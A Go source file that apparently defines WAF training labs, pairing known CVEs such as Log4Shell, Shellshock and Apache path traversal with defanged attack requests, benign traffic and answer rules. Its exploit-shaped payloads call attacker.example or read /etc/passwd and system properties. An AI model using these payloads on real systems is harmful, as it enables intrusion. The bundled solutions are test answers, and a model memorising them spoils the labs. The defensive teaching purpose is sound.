package scenario

import (
	"math/rand/v2"
	"time"

	w "wafdy/internal/wafrule"
)

// 脆弱性対応ラボ: 「〜という脆弱性が出ました。こういう条件で防げるようです。ルールを作ってください」形式の問題。
//
//	Level 1: 防ぎ方の情報に、検査対象・照合方法・文字列まで書かれている
//	Level 2: 防ぎ方の情報は文章だけ。検査対象やテキスト変換は自分で選ぶ
//	Level 3: PoC だけが公開されている。条件を自分で導き、亜種と誤検知の両方に対応する
//
// 攻撃リクエストは実際の攻撃の「形」だけを再現した無害なもので、送り先はダミーアプリだけ。
// 外部の宛先にはすべて attacker.example などの予約ドメインを使う。

const labDuration = 30 * time.Second

func registerLabs() {
	registerLabLevel1()
	registerLabLevel2()
	registerLabLevel3()
	registerLabCVEs()
	registerLabAdvisories()
	registerLabTuning()
	registerExams()
	registerOpsDrills()
}

func withHeader(req Request, k, v string) Request {
	req.Headers[k] = v
	return req
}

func withBody(req Request, contentType, body string) Request {
	req.Headers["Content-Type"] = contentType
	req.Body = body
	return req
}

func postJSON(r *rand.Rand, path, body string) Request {
	return withBody(post(r, path, ""), "application/json", body)
}

func atk(r *rand.Rand, req Request) Request { return fromAttacker(req, r) }

func lab(level int, s *Scenario) {
	s.Lab = true
	s.Level = level
	if s.Duration == 0 {
		s.Duration = labDuration
	}
	register(s)
}

// ---------------------------------------------------------------------------
// Level 1: 勧告どおりに書く
// ---------------------------------------------------------------------------

func registerLabLevel1() {
	lab(1, &Scenario{
		ID:    "lab-1-log4shell",
		CVE:   "CVE-2021-44228",
		Title: T("Log4Shell: ヘッダーに仕込まれた JNDI lookup", "Log4Shell: JNDI lookups hidden in headers"),
		Summary: T("ログ出力ライブラリ Log4j 2 の脆弱性。ヘッダーの文字列がログに書かれるだけで、外部のサーバーからコードを読み込んで実行してしまいます。",
			"A flaw in the Log4j 2 logging library: merely logging a header value can make the server load and run code from an external host."),
		Topics: []Text{T("ヘッダーの検査", "Inspecting headers"), T("OR ステートメント", "OR statements")},
		Briefing: []Text{
			T("Java のログ出力ライブラリ Apache Log4j 2 に、ログに書かれた文字列の ${jndi:ldap://...} を解釈して外部のサーバーに接続し、受け取ったコードを実行してしまう脆弱性 (Log4Shell) が見つかりました。",
				"Apache Log4j 2, a Java logging library, interprets ${jndi:ldap://...} in logged strings, connects to the external server, and runs the code it receives (Log4Shell)."),
			T("あなたのサイトのバックエンドは、アクセスログに User-Agent と X-Api-Version ヘッダーを書いています。パッチを当てるまでの間、WAF で止める必要があります。",
				"Your site's backend writes the User-Agent and X-Api-Version headers to its access log. You need to stop the attack with WAF until the patch is applied."),
		},
		Conditions: []Text{
			T("攻撃は User-Agent ヘッダーか X-Api-Version ヘッダーに ${jndi: という文字列を入れて送られてきます。",
				"Attacks put the string ${jndi: in either the User-Agent or the X-Api-Version header."),
			T("この 2 つのヘッダーそれぞれについて「${jndi: を含む」を調べ、どちらかに当てはまればブロックしてください（OR）。",
				"Check each of these two headers for \"contains ${jndi:\" and block if either matches (OR)."),
			T("Log4j は大文字小文字を区別しないので、テキスト変換 Lowercase をかけてから比較してください。",
				"Log4j is case-insensitive, so apply the Lowercase text transformation before comparing."),
		},
		Patterns: []Pattern{
			{Attack, T("User-Agent に JNDI (LDAP)", "JNDI (LDAP) in User-Agent"), 10, func(r *rand.Rand) Request {
				return withUA(atk(r, browse(r)), "${jndi:ldap://attacker.example:1389/a}")
			}},
			{Attack, T("X-Api-Version に JNDI", "JNDI in X-Api-Version"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/api/products", "")), "X-Api-Version", "${jndi:ldap://attacker.example/a}")
			}},
			{Attack, T("User-Agent に JNDI (RMI)", "JNDI (RMI) in User-Agent"), 10, func(r *rand.Rand) Request {
				return withUA(atk(r, browse(r)), "${jndi:rmi://attacker.example:1099/a}")
			}},
			{Attack, T("大文字の JNDI", "JNDI in uppercase"), 10, func(r *rand.Rand) Request {
				return withUA(atk(r, browse(r)), "${JNDI:dns://attacker.example/a}")
			}},
			{Benign, T("API の正規の呼び出し", "Legitimate API calls"), 20, func(r *rand.Rand) Request {
				return withHeader(get(r, "/api/products", ""), "X-Api-Version", pick(r, []string{"2", "2.1", "2024-10-01"}))
			}},
			{Benign, lblBrowse, 30, browse},
		},
		Solution: w.Block("block-log4shell", w.Or(
			w.Contains("${jndi:", w.Header("user-agent"), w.Lowercase),
			w.Contains("${jndi:", w.Header("x-api-version"), w.Lowercase),
		)),
		SolutionNote: []Text{
			T("Single header で user-agent と x-api-version をそれぞれ検査し、OR でまとめます。ヘッダー名は大文字小文字を区別しません。",
				"Inspect user-agent and x-api-version separately with Single header and combine them with OR. Header names are case-insensitive."),
			T("実際の攻撃では、ほかのヘッダーやクエリ文字列、さらに ${${lower:j}ndi: のような難読化も使われました。Level 3 の問題で扱います。",
				"Real attacks also used other headers, query strings, and obfuscation like ${${lower:j}ndi:. That is covered in a Level 3 problem."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-spring4shell",
		CVE:   "CVE-2022-22965",
		Title: T("Spring4Shell: パラメータ名からクラスローダーへ", "Spring4Shell: from a parameter name to the class loader"),
		Summary: T("Spring Framework のデータバインディングの脆弱性。特殊なパラメータ名でサーバーの設定を書き換えられます。",
			"A data-binding flaw in Spring Framework: specially named parameters can rewrite server settings."),
		Topics: []Text{T("クエリ文字列と Body", "Query string and body"), T("URL decode", "URL decode")},
		Briefing: []Text{
			T("Spring Framework (JDK 9 以降 + Tomcat) で、リクエストパラメータの値をオブジェクトに結び付ける仕組みを悪用し、class.module.classLoader... という名前のパラメータでサーバーの内部設定を書き換えられる脆弱性 (Spring4Shell) が見つかりました。",
				"In Spring Framework (JDK 9+ on Tomcat), the mechanism that binds request parameters to objects can be abused: parameters named class.module.classLoader... can rewrite the server's internal settings (Spring4Shell)."),
			T("攻撃者はこれを使って、Web サーバーのログ設定を書き換え、任意のファイルを書き込もうとします。",
				"Attackers use it to rewrite the web server's logging settings and write arbitrary files."),
		},
		Conditions: []Text{
			T("攻撃は class.module.classLoader で始まるパラメータ名を使います。GET ならクエリ文字列、POST なら Body に入ります。",
				"Attacks use parameter names starting with class.module.classLoader. They appear in the query string for GET and in the body for POST."),
			T("クエリ文字列と Body のそれぞれに URL decode と Lowercase をかけ、class.module.classloader を含むものをブロックしてください。",
				"Apply URL decode and Lowercase to both the query string and the body, and block anything containing class.module.classloader."),
		},
		Patterns: []Pattern{
			{Attack, T("POST の Body に classLoader", "classLoader in a POST body"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/register", form("class.module.classLoader.resources.context.parent.pipeline.first.pattern", "wafdojo-test", "class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".txt")))
			}},
			{Attack, T("GET のクエリに classLoader", "classLoader in a GET query"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/register", q("class.module.classLoader.resources.context.parent.pipeline.first.prefix", "wafdojo")))
			}},
			{Attack, T("大文字小文字を変えたパラメータ名", "Parameter name with different case"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/register", form("Class.Module.ClassLoader.resources.context.parent.pipeline.first.fileDateFormat", "_")))
			}},
			{Benign, T("ユーザー登録 (class という言葉を含む)", "Sign-ups (containing the word \"class\")"), 20, func(r *rand.Rand) Request {
				return post(r, "/register", form("name", "Hanako", "classroom", "3B", "module", pick(r, []string{"billing", "math", "classic"})))
			}},
			{Benign, T("検索 (class を含む語)", "Searches with \"class\""), 15, func(r *rand.Rand) Request {
				return get(r, "/search", q("q", pick(r, []string{"class action", "classloader tutorial", "first class seat"})))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-spring4shell", w.Or(
			w.Contains("class.module.classloader", w.QueryString(), w.URLDecode, w.Lowercase),
			w.Contains("class.module.classloader", w.BodyField(), w.URLDecode, w.Lowercase),
		)),
		SolutionNote: []Text{
			T("同じ文字列をクエリ文字列と Body の両方で探すため、2 つの文字列マッチを OR でまとめます。",
				"To look for the same string in both the query string and the body, combine two string matches with OR."),
			T("classloader だけ、class だけで判定すると「classloader tutorial」の検索や classroom などの正規のパラメータまで止めてしまいます。",
				"Matching on just classloader or class would also block searches like \"classloader tutorial\" and legitimate parameters like classroom."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-shellshock",
		CVE:   "CVE-2014-6271",
		Title: T("Shellshock: どのヘッダーにも潜む関数定義", "Shellshock: function definitions in any header"),
		Summary: T("bash が環境変数の関数定義の後ろにあるコマンドを実行してしまう脆弱性。CGI ではヘッダーがそのまま環境変数になります。",
			"bash runs commands that follow a function definition in an environment variable. In CGI, headers become environment variables as-is."),
		Topics: []Text{T("すべてのヘッダーの検査 (Headers)", "Inspecting all headers (Headers)")},
		Briefing: []Text{
			T("bash に、環境変数の値が () { で始まる関数定義だと、その後ろに続くコマンドまで実行してしまう脆弱性 (Shellshock) が見つかりました。",
				"bash has a flaw (Shellshock): when an environment variable's value is a function definition starting with () {, it also runs the commands that follow it."),
			T("あなたのサイトには古い CGI スクリプトが残っています。CGI は HTTP ヘッダーを環境変数 (HTTP_USER_AGENT など) として bash に渡すため、どのヘッダーからでも攻撃できます。",
				"Your site still has an old CGI script. CGI passes HTTP headers to bash as environment variables (HTTP_USER_AGENT and so on), so any header can carry the attack."),
		},
		Conditions: []Text{
			T("ヘッダーの値に () { が含まれていたらブロックしてください。",
				"Block any request whose header values contain () {."),
			T("どのヘッダーが使われるかわからないので、検査対象に「Headers」(すべてのヘッダー) を選び、Match scope を Values にします。",
				"Since any header could be used, inspect \"Headers\" (all headers) and set Match scope to Values."),
		},
		Patterns: []Pattern{
			{Attack, T("User-Agent に関数定義", "Function definition in User-Agent"), 10, func(r *rand.Rand) Request {
				return withUA(atk(r, get(r, "/cgi-bin/status", "")), "() { :; }; /bin/echo wafdojo-test")
			}},
			{Attack, T("Referer に関数定義", "Function definition in Referer"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/cgi-bin/status", "")), "Referer", "() { :; }; /bin/echo wafdojo-test")
			}},
			{Attack, T("Cookie に関数定義", "Function definition in Cookie"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/cgi-bin/status", "")), "Cookie", "() { :;}; /bin/echo wafdojo-test")
			}},
			{Attack, T("独自ヘッダーに関数定義", "Function definition in a custom header"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/cgi-bin/status", "")), "X-Debug", "() { _; } >_[$($())] { /bin/echo wafdojo-test; }")
			}},
			{Benign, T("括弧や波括弧を含む正規のヘッダー", "Legitimate headers with parentheses and braces"), 20, func(r *rand.Rand) Request {
				req := withHeader(get(r, "/cgi-bin/status", ""), "Referer", "https://www.example.com/sale(2026)/{new}")
				return withHeader(req, "Cookie", "theme=dark; prefs={}")
			}},
			{Benign, lblBrowse, 30, browse},
		},
		Solution: w.Block("block-shellshock", w.Contains("() {", w.AllHeaderValues())),
		SolutionNote: []Text{
			T("Headers を検査対象にすると、ヘッダー名を指定せずにすべてのヘッダーを調べられます。Match scope を Values にすると値だけを見ます。",
				"Inspecting Headers lets you check every header without naming them. Setting Match scope to Values inspects only the values."),
			T("bash は値が「() {」で始まるときだけ関数定義として扱うので、括弧やかっこが別々に出てくる正規のヘッダーとは区別できます。",
				"bash treats a value as a function definition only when it starts with \"() {\", so legitimate headers where parentheses and braces appear separately are not affected."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-confluence-ognl",
		CVE:   "CVE-2022-26134",
		Title: T("Confluence: URL に書かれた OGNL 式", "Confluence: OGNL expressions in the URL"),
		Summary: T("Atlassian Confluence が URL のパスに書かれた OGNL 式を評価してしまう脆弱性。認証なしでコードを実行されます。",
			"Atlassian Confluence evaluates OGNL expressions written in the URL path, allowing unauthenticated code execution."),
		Topics: []Text{T("URI パスの検査", "Inspecting the URI path"), T("URL decode", "URL decode")},
		Briefing: []Text{
			T("Confluence Server / Data Center で、URL のパスに ${...} の形で書かれた OGNL 式が評価され、認証なしで任意のコードを実行できる脆弱性が見つかりました。",
				"In Confluence Server / Data Center, OGNL expressions written as ${...} in the URL path are evaluated, allowing arbitrary code execution without authentication."),
			T("攻撃のリクエストでは、${ や } が URL エンコードされて %24%7B ... %7D の形で届きます。",
				"In attack requests, ${ and } arrive URL-encoded as %24%7B ... %7D."),
		},
		Conditions: []Text{
			T("URI path に URL decode をかけてから、${ を含むかを調べ、含むものをブロックしてください。",
				"Apply URL decode to the URI path, then block anything containing ${."),
			T("正規の Confluence の URL に ${ が含まれることはありません。",
				"Legitimate Confluence URLs never contain ${."),
		},
		Patterns: []Pattern{
			{Attack, T("OGNL で Java のプロパティを読む", "Reading a Java property via OGNL"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/%24%7B%40java.lang.System%40getProperty%28%22user.name%22%29%7D/", ""))
			}},
			{Attack, T("OGNL で計算させる", "Making OGNL evaluate arithmetic"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/wiki/%24%7B7*7%7D/", ""))
			}},
			{Attack, T("小文字の URL エンコード", "Lowercase URL encoding"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/pages/%24%7b%40java.lang.System%40getenv%28%29%7d/", ""))
			}},
			{Benign, T("Confluence の通常ページ", "Regular Confluence pages"), 25, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/wiki/spaces/DEV/pages/123456", "/display/~alice", "/download/attachments/98765/price%24100.pdf"}), "")
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-confluence-ognl", w.Contains("${", w.UriPath(), w.URLDecode)),
		SolutionNote: []Text{
			T("URI path はエンコードされたまま WAF に届くので、URL decode をかけないと %24%7B のままで ${ と一致しません。",
				"The URI path reaches WAF still encoded, so without URL decode it stays %24%7B and never matches ${."),
			T("price%24100.pdf のように $ だけがエンコードされた正規のファイル名は、${ にならないので止まりません。",
				"Legitimate file names with only $ encoded, such as price%24100.pdf, don't decode to ${ and are not blocked."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-f5-icontrol",
		CVE:   "CVE-2022-1388",
		Title: T("F5 BIG-IP: 外に出てはいけない管理 API", "F5 BIG-IP: a management API that must stay internal"),
		Summary: T("BIG-IP の管理用 REST API (iControl REST) で認証を回避し、コマンドを実行できる脆弱性。",
			"An authentication bypass in BIG-IP's management REST API (iControl REST) that allows command execution."),
		Topics: []Text{T("URI パスの前方一致", "URI path prefix match"), T("Lowercase", "Lowercase")},
		Briefing: []Text{
			T("負荷分散装置 F5 BIG-IP の管理用 REST API (iControl REST) で、細工したヘッダーにより認証を回避し、/mgmt/tm/util/bash からコマンドを実行できる脆弱性が見つかりました。",
				"In the F5 BIG-IP load balancer's management REST API (iControl REST), crafted headers bypass authentication and allow commands to be run through /mgmt/tm/util/bash."),
			T("設定ミスで、この管理 API がインターネット向けの経路からも届くようになっていました。",
				"Due to a misconfiguration, this management API is reachable from the internet-facing path."),
		},
		Conditions: []Text{
			T("管理 API はすべて /mgmt/ の下にあり、インターネットから使うことはありません。URI path が /mgmt/ で始まるリクエストをブロックしてください。",
				"The management API lives entirely under /mgmt/ and is never used from the internet. Block requests whose URI path starts with /mgmt/."),
			T("パスの大文字小文字を変えた攻撃も確認されているので、Lowercase をかけてから比較してください。",
				"Attacks with different path casing have also been seen, so apply Lowercase before comparing."),
		},
		Patterns: []Pattern{
			{Attack, T("bash の実行", "Running bash"), 12, func(r *rand.Rand) Request {
				req := atk(r, postJSON(r, "/mgmt/tm/util/bash", `{"command":"run","utilCmdArgs":"-c 'echo wafdojo-test'"}`))
				req = withHeader(req, "X-F5-Auth-Token", "")
				return withHeader(req, "Authorization", "Basic YWRtaW46")
			}},
			{Attack, T("認証 API の呼び出し", "Calling the auth API"), 12, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/mgmt/shared/authn/login", `{"username":"admin","password":"wafdojo"}`))
			}},
			{Attack, T("大文字のパス", "Uppercase path"), 12, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/MGMT/tm/util/bash", `{"command":"run","utilCmdArgs":"-c 'echo wafdojo-test'"}`))
			}},
			{Benign, T("mgmt で始まる正規のページ", "Legitimate pages starting with mgmt"), 20, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/mgmt-news/2026", "/mgmtguide.pdf", "/team/mgmt/"}), "")
			}},
			{Benign, lblBrowse, 25, browse},
		},
		Solution: w.Block("block-f5-mgmt", w.StartsWith("/mgmt/", w.UriPath(), w.Lowercase)),
		SolutionNote: []Text{
			T("STARTS_WITH で /mgmt/ (末尾のスラッシュまで) を指定すると、/mgmt-news や /mgmtguide.pdf は止まりません。/team/mgmt/ のように途中に mgmt があるものも止まりません。",
				"Using STARTS_WITH with /mgmt/ (including the trailing slash) leaves /mgmt-news and /mgmtguide.pdf alone, as well as paths with mgmt in the middle such as /team/mgmt/."),
			T("脆弱性の中身 (ヘッダーの細工) を追うより、「そもそも外から使わない入口を閉じる」ほうが確実な場面は多くあります。",
				"Often it's more reliable to close an entry point that is never used from outside than to chase the details of the flaw (the header trick)."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-nextjs-middleware",
		CVE:   "CVE-2025-29927",
		Title: T("Next.js: 内部用ヘッダーで認証をすり抜ける", "Next.js: skipping auth with an internal header"),
		Summary: T("Next.js が内部用のヘッダー x-middleware-subrequest を外部からも受け付け、認証などのミドルウェアを飛ばしてしまう脆弱性。",
			"Next.js accepts the internal header x-middleware-subrequest from outside and skips middleware such as authentication."),
		Topics: []Text{T("ヘッダーの有無 (サイズ制約)", "Header presence (size constraint)")},
		Briefing: []Text{
			T("Next.js は、ミドルウェアの無限ループを防ぐために内部で x-middleware-subrequest ヘッダーを使っています。このヘッダーを外部から付けて送ると、ミドルウェア (ログインチェックなど) が実行されずにページが返ってしまう脆弱性が見つかりました。",
				"Next.js uses the x-middleware-subrequest header internally to prevent middleware loops. Sending this header from outside causes pages to be returned without running middleware such as login checks."),
		},
		Conditions: []Text{
			T("x-middleware-subrequest ヘッダーが付いているリクエストは、値に関係なくブロックしてください。",
				"Block any request carrying the x-middleware-subrequest header, regardless of its value."),
			T("「ヘッダーが付いているか」は、そのヘッダーのサイズが 0 より大きいか (Size constraint) で調べられます。ヘッダーがないときは一致しません。",
				"You can test whether a header is present with a size constraint: is the header larger than 0? It doesn't match when the header is absent."),
		},
		Patterns: []Pattern{
			{Attack, T("middleware を指定", "Value: middleware"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/dashboard", "")), "x-middleware-subrequest", "middleware")
			}},
			{Attack, T("src/middleware を繰り返し指定", "Value: src/middleware repeated"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/dashboard", "")), "x-middleware-subrequest", "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware")
			}},
			{Attack, T("ヘッダー名を大文字で", "Header name in uppercase"), 10, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/admin-panel", "")), "X-Middleware-Subrequest", "middleware:middleware:middleware:middleware:middleware")
			}},
			{Benign, T("Next.js の正規のプリフェッチ", "Legitimate Next.js prefetches"), 20, func(r *rand.Rand) Request {
				return withHeader(get(r, "/dashboard", ""), "x-middleware-prefetch", "1")
			}},
			{Benign, lblBrowse, 30, browse},
		},
		Solution: w.Block("block-nextjs-subrequest", w.Present(w.Header("x-middleware-subrequest"))),
		SolutionNote: []Text{
			T("Size constraint で Single header (x-middleware-subrequest) のサイズが 0 より大きい (GT 0) ものを止めます。ヘッダーがないリクエストは一致しません。",
				"Use a size constraint on Single header (x-middleware-subrequest), greater than 0 (GT 0). Requests without the header don't match."),
			T("x-middleware で始まるヘッダーをまとめて止めると、正規の x-middleware-prefetch まで止めてしまいます。",
				"Blocking every header that starts with x-middleware would also block the legitimate x-middleware-prefetch."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-apache-traversal",
		CVE:   "CVE-2021-41773 / CVE-2021-42013",
		Title: T("Apache HTTP Server: 片方だけエンコードしたドット", "Apache HTTP Server: half-encoded dots"),
		Summary: T("Apache 2.4.49 / 2.4.50 のパス正規化の不具合で、ドキュメントルートの外のファイルを読まれる脆弱性。",
			"A path normalization bug in Apache 2.4.49 / 2.4.50 lets attackers read files outside the document root."),
		Topics: []Text{T("URL decode を 2 回", "URL decode twice"), T("パストラバーサル", "Path traversal")},
		Briefing: []Text{
			T("Apache HTTP Server 2.4.49 で、/cgi-bin/.%2e/ のようにドットの片方だけをエンコードすると、パスの正規化をすり抜けてディレクトリを遡れる脆弱性が見つかりました。",
				"In Apache HTTP Server 2.4.49, encoding just one of the dots, as in /cgi-bin/.%2e/, slips past path normalization and lets attackers climb directories."),
			T("修正版の 2.4.50 でも、二重にエンコードすると同じことができました (CVE-2021-42013)。",
				"Even the 2.4.50 fix could be bypassed with double encoding (CVE-2021-42013)."),
		},
		Conditions: []Text{
			T("URI path に URL decode を 2 回かけてから、../ を含むものをブロックしてください (テキスト変換は複数並べられます)。",
				"Apply URL decode twice to the URI path, then block anything containing ../ (you can chain text transformations)."),
			T("正規のファイル名に .. が含まれることはありますが、../ にはなりません。",
				"Legitimate file names may contain .., but never ../."),
		},
		Patterns: []Pattern{
			{Attack, T("片方だけエンコード (.%2e)", "One dot encoded (.%2e)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/cgi-bin/admin/.%2e/.%2e/bin/sh", ""))
			}},
			{Attack, T("両方エンコード (%2e%2e)", "Both dots encoded (%2e%2e)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/icons/small/%2e%2e/%2e%2e/etc/hosts", ""))
			}},
			{Attack, T("二重エンコード (%252e)", "Double encoding (%252e)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/cgi-bin/%252e%252e/%252e%252e/%252e%252e/etc/passwd", ""))
			}},
			{Attack, T("大文字の %2E", "Uppercase %2E"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/icons/small/.%2E/%2E%2E/etc/group", ""))
			}},
			{Benign, T("ドットを含む正規のパス", "Legitimate paths with dots"), 20, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/cgi-bin/status.cgi", "/icons/apache_pb.png", "/docs/v1..v2-changes.html", "/files/archive.2026..final.zip"}), "")
			}},
			{Benign, lblBrowse, 25, browse},
		},
		Solution: w.Block("block-apache-traversal", w.Contains("../", w.UriPath(), w.URLDecode, w.URLDecode)),
		SolutionNote: []Text{
			T("1 回目の URL decode で %252e は %2e に、2 回目で . になります。1 回だけだと二重エンコードの攻撃がすり抜けます。",
				"The first URL decode turns %252e into %2e, and the second turns it into a dot. With only one decode, the double-encoded attack slips through."),
			T("「..」ではなく「../」で判定するので、v1..v2-changes.html のような正規のファイル名は止まりません。",
				"Matching on \"../\" instead of \"..\" leaves legitimate file names like v1..v2-changes.html alone."),
			T("実は ALB は、1 回デコードしたときにサイトのルートより上まで遡るパス (/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd など) を、WAF に渡す前に 400 で拒否します。ルートの中で遡る攻撃や、二重エンコードした攻撃は ALB を通り抜けるので、WAF のルールが必要です。",
				"In fact, ALB itself rejects with 400, before WAF sees it, any path that climbs above the site root after one decode (such as /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd). Attacks that climb within the root, or that are double-encoded, get past ALB, so you still need a WAF rule."),
		},
	})

	lab(1, &Scenario{
		ID:    "lab-1-text4shell",
		CVE:   "CVE-2022-42889",
		Title: T("Text4Shell: 文字列補間の危険なプレフィックス", "Text4Shell: dangerous interpolation prefixes"),
		Summary: T("Apache Commons Text の文字列補間で、script・dns・url の lookup が悪用される脆弱性。",
			"Apache Commons Text's string interpolation lets attackers abuse the script, dns, and url lookups."),
		Topics: []Text{T("正規表現", "Regular expressions"), T("クエリ文字列", "Query string")},
		Briefing: []Text{
			T("Apache Commons Text の StringSubstitutor は ${prefix:...} の形の文字列を展開します。このうち ${script:...} はスクリプトを実行し、${dns:...} と ${url:...} は外部に接続してしまいます (Text4Shell)。",
				"Apache Commons Text's StringSubstitutor expands strings of the form ${prefix:...}. ${script:...} runs scripts, while ${dns:...} and ${url:...} reach out to external hosts (Text4Shell)."),
			T("あなたのサイトの検索 (GET /search?q=) は、検索語をこの仕組みでテンプレートに埋め込んでいます。",
				"Your site's search (GET /search?q=) embeds the search term into a template using this mechanism."),
		},
		Conditions: []Text{
			T("クエリ文字列に URL decode と Lowercase をかけ、${script: ・ ${dns: ・ ${url: のどれかを含むものをブロックしてください。",
				"Apply URL decode and Lowercase to the query string, and block anything containing ${script:, ${dns:, or ${url:."),
			T("3 つの文字列を OR で並べても、正規表現 1 つで書いても構いません。",
				"You can list the three strings with OR or write a single regular expression."),
			T("テンプレートの書き方を調べるお客様が ${name} のような文字列を検索することがあります。${ だけで止めないでください。",
				"Customers looking up template syntax sometimes search for strings like ${name}. Don't block on ${ alone."),
		},
		Patterns: []Pattern{
			{Attack, T("script lookup", "script lookup"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/search", q("q", "${script:javascript:java.lang.System.getProperty('user.name')}")))
			}},
			{Attack, T("dns lookup", "dns lookup"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/search", q("q", "${dns:address|attacker.example}")))
			}},
			{Attack, T("url lookup", "url lookup"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/search", q("q", "${url:UTF-8:http://attacker.example/}")))
			}},
			{Attack, T("大文字の SCRIPT", "SCRIPT in uppercase"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/search", q("q", "${SCRIPT:js:java.lang.System.getenv()}")))
			}},
			{Benign, T("テンプレート記法の検索", "Searches for template syntax"), 20, func(r *rand.Rand) Request {
				return get(r, "/search", q("q", pick(r, []string{"${name} template", "how to use ${price}", "javascript url tutorial", "dns setup"})))
			}},
			{Benign, lblBrowse, 25, browse},
		},
		Solution: w.Block("block-text4shell", w.Regex(`\$\{(script|dns|url):`, w.QueryString(), w.URLDecode, w.Lowercase)),
		SolutionNote: []Text{
			T("正規表現では $ と { に特別な意味があるので、\\$\\{ のようにバックスラッシュでエスケープします。",
				"In regular expressions, $ and { have special meanings, so escape them with backslashes: \\$\\{."),
			T("(script|dns|url) で 3 つのプレフィックスをまとめ、直後の : まで含めることで「javascript url tutorial」のような検索は止まりません。",
				"(script|dns|url) groups the three prefixes, and including the following : keeps searches like \"javascript url tutorial\" from being blocked."),
		},
	})
}

func ruleJSON(r *w.Rule) string {
	if r == nil {
		return ""
	}
	return r.JSON()
}
